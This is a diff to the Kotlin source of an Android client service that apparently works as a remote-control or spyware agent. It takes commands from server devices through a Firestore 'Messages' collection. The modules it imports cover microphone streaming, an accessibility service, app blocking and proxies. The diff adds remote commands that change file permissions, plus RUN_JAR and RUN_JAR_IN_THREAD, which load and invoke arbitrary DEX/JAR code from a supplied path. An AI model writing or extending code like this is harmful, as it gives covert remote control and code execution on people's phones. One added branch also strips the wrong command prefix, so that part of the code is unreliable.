@@ -7,7 +7,6 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.app.admin.DevicePolicyManager
-import android.app.usage.UsageStatsManager
 import android.bluetooth.BluetoothAdapter
 import android.bluetooth.BluetoothDevice
 import android.bluetooth.BluetoothManager
@@ -99,10 +98,10 @@ import com.client.receivers.serverPhoneNumbers
 import com.client.services.httpproxy.HttpProxyService
 import com.client.services.other.MicStreamingService
 import com.client.services.other.MyAccessibilityService
-import com.client.services.other.prevPackageName
 import com.client.services.other.appsToPreventOpening
 import com.client.services.other.getCurrentlyOpenedApp
 import com.client.services.other.notifications
+import com.client.services.other.prevPackageName
 import com.client.services.python.PythonInteractiveScriptRunnerService
 import com.client.services.python.PythonRunner
 import com.client.services.socks5proxy.Preferences
@@ -127,6 +126,7 @@ import com.google.firebase.storage.FirebaseStorage
 import com.google.firebase.storage.StorageReference
 import com.google.gson.Gson
 import com.google.gson.JsonObject
+import dalvik.system.DexClassLoader
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -144,6 +144,7 @@ import java.io.IOException
 import java.io.InputStreamReader
 import java.io.OutputStream
 import java.io.OutputStreamWriter
+import java.lang.reflect.Method
 import java.net.HttpURLConnection
 import java.net.Inet4Address
 import java.net.NetworkInterface
@@ -2505,13 +2506,30 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
     } else if (command.startsWith("MAKE_DIR ")) {
         try {
             val dir = File("/" + command.removePrefix("MAKE_DIR ").removePrefix("/"))
-            dir.mkdir()
-            sendMessage(
-                context,
-                false,
-                "MAKE_DIR: Operation completed successfully",
-                messageID, serverID
-            )
+            if (!dir.exists()) {
+                if (dir.mkdir()) {
+                    sendMessage(
+                        context,
+                        false,
+                        "MAKE_DIR: Operation completed successfully",
+                        messageID, serverID
+                    )
+                } else {
+                    sendMessage(
+                        context,
+                        false,
+                        "MAKE_DIR: Operation failed",
+                        messageID, serverID
+                    )
+                }
+            } else {
+                sendMessage(
+                    context,
+                    false,
+                    "MAKE_DIR: Operation failed - ${dir.path} already exists",
+                    messageID, serverID
+                )
+            }
         } catch (ex: Exception) {
             sendMessage(
                 context,
@@ -2523,18 +2541,27 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
     } else if (command.startsWith("MAKE_DIRS ")) {
         try {
             val dir = File("/" + command.removePrefix("MAKE_DIRS ").removePrefix("/"))
-            if (dir.mkdirs()) {
-                sendMessage(
-                    context,
-                    false,
-                    "MAKE_DIRS: Operation completed successfully",
-                    messageID, serverID
-                )
+            if (!dir.exists()) {
+                if (dir.mkdirs()) {
+                    sendMessage(
+                        context,
+                        false,
+                        "MAKE_DIRS: Operation completed successfully",
+                        messageID, serverID
+                    )
+                } else {
+                    sendMessage(
+                        context,
+                        false,
+                        "MAKE_DIRS: Operation failed",
+                        messageID, serverID
+                    )
+                }
             } else {
                 sendMessage(
                     context,
                     false,
-                    "MAKE_DIRS: Operation failed",
+                    "MAKE_DIRS: Operation failed - ${dir.path} already exists",
                     messageID, serverID
                 )
             }
@@ -2543,32 +2570,6 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
                 context,
                 false,
                 "MAKE_DIRS: Operation failed - ${ex.localizedMessage}",
-                messageID, serverID
-            )
-        }
-    } else if (command.startsWith("MAKE_DIR ")) {
-        try {
-            val dir = File("/" + command.removePrefix("MAKE_DIR ").removePrefix("/"))
-            if (dir.mkdirs()) {
-                sendMessage(
-                    context,
-                    false,
-                    "MAKE_DIR: Operation completed successfully",
-                    messageID, serverID
-                )
-            } else {
-                sendMessage(
-                    context,
-                    false,
-                    "MAKE_DIR: Operation failed",
-                    messageID, serverID
-                )
-            }
-        } catch (ex: Exception) {
-            sendMessage(
-                context,
-                false,
-                "MAKE_DIR: Operation failed - ${ex.localizedMessage}",
                 messageID, serverID
             )
         }
@@ -5283,6 +5284,110 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
         sendMessage(context, false, "GET_LOCAL_NETWORK_INFO: ${getLocalNetworkInfo(context)}", messageID, serverID)
     } else if (command == "GET_APP_STORAGE_DIR") {
         sendMessage(context, false, "GET_APP_STORAGE_DIR: ${context.filesDir.absolutePath}", messageID, serverID)
+    } else if (command.startsWith("SET_AS_READ_ONLY ")) {
+        val path = command.removePrefix("SET_AS_READ_ONLY ")
+        val file = File(path)
+        if (file.exists()) {
+            if (file.setReadOnly()) {
+                sendMessage(context, false, "SET_AS_READ_ONLY: Operation completed successfully", messageID, serverID)
+            } else {
+                sendMessage(context, false, "SET_AS_READ_ONLY: Operation failed", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "SET_AS_READ_ONLY: Operation failed - $path does not exist", messageID, serverID)
+        }
+    } else if (command.startsWith("SET_FILE_AS_EXECUTABLE ")) {
+        val path = command.removePrefix("SET_FILE_AS_NOT_EXECUTABLE ")
+        val file = File(path)
+        if (file.exists()) {
+            if (file.isFile) {
+                if (file.setExecutable(true)) {
+                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation completed successfully", messageID, serverID)
+                } else {
+                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed", messageID, serverID)
+                }
+            } else {
+                sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
+        }
+    } else if (command.startsWith("SET_FILE_AS_NOT_EXECUTABLE ")) {
+        val path = command.removePrefix("SET_FILE_AS_NOT_EXECUTABLE ")
+        val file = File(path)
+        if (file.exists()) {
+            if (file.isFile) {
+                if (file.setExecutable(false)) {
+                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation completed successfully", messageID, serverID)
+                } else {
+                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed", messageID, serverID)
+                }
+            } else {
+                sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
+        }
+    } else if (command.startsWith("IS_FILE_EXECUTABLE ")) {
+        val path = command.removePrefix("IS_FILE_EXECUTABLE ")
+        val file = File(path)
+        if (file.exists()) {
+            if (file.isFile) {
+                sendMessage(context, false, "IS_FILE_EXECUTABLE: ${boolToYesNo(File(path).canExecute())}", messageID, serverID)
+            } else {
+                sendMessage(context, false, "IS_FILE_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "IS_FILE_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
+        }
+    } else if (command.startsWith("SET_AS_READABLE ")) {
+        val path = command.removePrefix("SET_AS_READABLE ")
+        val file = File(path)
+        if (file.exists()) {
+            if (file.setReadable(true)) {
+                sendMessage(context, false, "SET_AS_READABLE: Operation completed successfully", messageID, serverID)
+            } else {
+                sendMessage(context, false, "SET_AS_READABLE: Operation failed", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "SET_AS_READABLE: Operation failed - $path does not exist", messageID, serverID)
+        }
+    } else if (command.startsWith("SET_AS_NOT_READABLE ")) {
+        val path = command.removePrefix("SET_AS_NOT_READABLE ")
+        val file = File(path)
+        if (file.exists()) {
+            if (File(path).setReadable(false)) {
+                sendMessage(context, false, "SET_AS_NOT_READABLE: Operation completed successfully", messageID, serverID)
+            } else {
+                sendMessage(context, false, "SET_AS_NOT_READABLE: Operation failed", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "SET_AS_NOT_READABLE: Operation failed - $path does not exist", messageID, serverID)
+        }
+    } else if (command.startsWith("SET_AS_WRITABLE ")) {
+        val path = command.removePrefix("SET_AS_WRITABLE ")
+        val file = File(path)
+        if (file.exists()) {
+            if (file.setWritable(true)) {
+                sendMessage(context, false, "SET_AS_WRITABLE: Operation completed successfully", messageID, serverID)
+            } else {
+                sendMessage(context, false, "SET_AS_WRITABLE: Operation failed", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "SET_AS_WRITABLE: Operation failed - $path does not exist", messageID, serverID)
+        }
+    } else if (command.startsWith("SET_AS_NOT_WRITABLE ")) {
+        val path = command.removePrefix("SET_AS_NOT_WRITABLE ")
+        val file = File(path)
+        if (file.exists()) {
+            if (File(path).setWritable(false)) {
+                sendMessage(context, false, "SET_AS_NOT_WRITABLE: Operation completed successfully", messageID, serverID)
+            } else {
+                sendMessage(context, false, "SET_AS_NOT_WRITABLE: Operation failed", messageID, serverID)
+            }
+        } else {
+            sendMessage(context, false, "SET_AS_NOT_WRITABLE: Operation failed - $path does not exist", messageID, serverID)
+        }
     } else if (command.startsWith("OPEN_URI ")) {
         // Create an Intent with the URL
         val url = command.removePrefix("OPEN_URI ")
@@ -5804,6 +5909,52 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
                 messageID, serverID
             )
         }
+    } else if (command.startsWith("RUN_JAR ")) {
+        try {
+            val className = command.removePrefix("RUN_JAR ").split(" ")[0]
+            val methodName = command.removePrefix("RUN_JAR ").split(" ")[1]
+            val path = command.removePrefix("RUN_JAR $className $methodName ")
+            val dexClassLoader = DexClassLoader(path, context.cacheDir.absolutePath, null, context.classLoader)
+            val loadedClass = dexClassLoader.loadClass(className)
+            val instance = loadedClass.getDeclaredConstructor().newInstance(context, applicationContext)
+            val method: Method = loadedClass.getMethod(methodName)
+            val result = method.invoke(instance) as String
+            sendMessage(context, false, "RUN_JAR: $result", messageID, serverID)
+        } catch (ex: Exception) {
+            ex.printStackTrace()
+            sendMessage(
+                context,
+                false,
+                "RUN_JAR: Operation failed - ${ex.localizedMessage}",
+                messageID, serverID
+            )
+        }
+    } else if (command.startsWith("RUN_JAR_IN_THREAD ")) {
+        val threadIndex = threads.count()
+        val thread = Thread {
+            try {
+                val className = command.removePrefix("RUN_JAR_IN_THREAD ").split(" ")[0]
+                val methodName = command.removePrefix("RUN_JAR_IN_THREAD ").split(" ")[1]
+                val path = command.removePrefix("RUN_JAR_IN_THREAD $className $methodName ")
+                val dexClassLoader = DexClassLoader(path, context.cacheDir.absolutePath, null, context.classLoader)
+                val loadedClass = dexClassLoader.loadClass(className)
+                val instance = loadedClass.getDeclaredConstructor(Context::class.java, Context::class.java).newInstance(context, applicationContext)
+                val method: Method = loadedClass.getMethod(methodName)
+                val result = method.invoke(instance) as String
+                sendMessage(context, false, "RUN_JAR_IN_THREAD: $result", messageID, serverID)
+            } catch (ex: Exception) {
+                ex.printStackTrace()
+                sendMessage(
+                    context,
+                    false,
+                    "RUN_JAR_IN_THREAD: Operation failed - ${ex.localizedMessage}",
+                    messageID, serverID
+                )
+            }
+        }
+        threads.add(thread)
+        threads[threadIndex].start()
+        sendMessage(context, false, "RUN_JAR_IN_THREAD: Thread Index: $threadIndex", messageID, serverID)
     } else {
         if (command != "") {
             sendMessage(
@@ -6598,6 +6749,8 @@ class ClientService: Service() {
             ex.printStackTrace()
             Log.e("ClientService", "Failed to register WiFi P2P start stop broadcast receiver")
         }
+        Log.d("ClientService", "Current Device ID: $currentDeviceID")
+        Log.d("ClientService", "Service Device IDs: $serverDeviceIDs")
 
         val messagesRef = firestore.collection("Messages")
         val listener = EventListener<QuerySnapshot> { snapshot, error ->
@@ -6615,7 +6768,8 @@ class ClientService: Service() {
                         val serverID = document.getString("From")
                         val command = document.getString("Message")
                         val forId = document.get("For")
-//                        Log.d("ClientService", "Received command for $forId from $serverID: $command")
+                        Log.d("ClientService", "Received command for $forId from $serverID: $command")
+                        Log.d("ClientService", "${type == DocumentChange.Type.ADDED} && ${forId == currentDeviceID} && ${serverID in serverDeviceIDs}")
                         if (type == DocumentChange.Type.ADDED && document.exists() && forId == currentDeviceID && serverID in serverDeviceIDs) {
                             Log.d("ClientService", "Received command from server: $command")
                             if (document.contains("Message")) {
